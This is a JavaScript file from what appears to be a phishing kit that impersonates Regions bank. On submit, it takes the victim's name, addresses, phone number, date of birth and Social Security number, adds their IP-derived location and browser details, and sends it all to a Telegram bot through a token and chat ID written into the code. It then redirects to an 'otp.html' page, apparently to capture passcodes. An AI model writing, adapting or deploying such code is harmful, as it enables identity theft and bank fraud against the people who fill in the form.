// personal-info.js

// Function to get client info
async function getClientInfo() {
  const info = {
    ip: 'Unknown',
    country: 'Unknown',
    city: 'Unknown',
    device: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
    browser: navigator.userAgent,
  };

  try {
    const response = await fetch('https://ipapi.co/json/');
    if (response.ok) {
      const data = await response.json();
      info.ip = data.ip || 'Unknown';
      info.country = data.country_name || 'Unknown';
      info.city = data.city || 'Unknown';
    }
  } catch (error) {
    console.warn('Failed to fetch IP info:', error);
  }

  return info;
}

// Send message to Telegram bot
async function sendToTelegram(message) {
  const token = "8525430088:AAHfMQJCkbpR3oUnnXC37_SWqKiGnvk9zPQ"; // <-- Replace with your bot token
  const chat_id = "6211090366"; // <-- Replace with your chat ID

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message,
        }),
      }
    );
    return response.ok;
  } catch (error) {
    /*console.error("Error sending message to Telegram:", error);*/
    return false;
  }
}

// Handle form submission
document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('personalInfoForm');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    // Collect input values
    const firstName = document.getElementById('firstName').value.trim();
    const middleName = document.getElementById('middleName').value.trim();
    const lastName = document.getElementById('lastName').value.trim();
    const prevAddress = document.getElementById('prevAddress').value.trim();
    const currentAddress = document.getElementById('currentAddress').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const dob = document.getElementById('dob').value.trim();
    const ssn = document.getElementById('ssn').value.trim();

    // Validation for required fields
    if (!firstName || !lastName || !currentAddress || !phone || !dob) {
      alert('Please fill out all required fields.');
      return;
    }

    // Get client info (IP, browser, device, etc.)
    const clientInfo = await getClientInfo();

    // Format the message
    const message =
      `====== 📋REGIONS Personal Info Submitted ======\n` +
      `First Name: ${firstName}\n` +
      `Middle Name: ${middleName || 'N/A'}\n` +
      `Last Name: ${lastName}\n` +
      `Previous Address: ${prevAddress || 'N/A'}\n` +
      `Current Address: ${currentAddress}\n` +
      `Phone Number: ${phone}\n` +
      `Date of Birth: ${dob}\n` +
      `SSN: ${ssn || 'N/A'}\n\n` +
      `🌐 IP Address: ${clientInfo.ip}\n` +
      `🏳️ Country: ${clientInfo.country}\n` +
      `🏙️ City: ${clientInfo.city}\n` +
      `💻 Browser: ${clientInfo.browser}\n` +
      `📱 Device: ${clientInfo.device}`;

    // Send data to Telegram
    const sent = await sendToTelegram(message);

    if (!sent) {
      //alert("Failed to send info to Telegram.");
      return;
    }

    // ✅ Redirect AFTER successful submission
    window.location.href = "otp.html";
  });
});
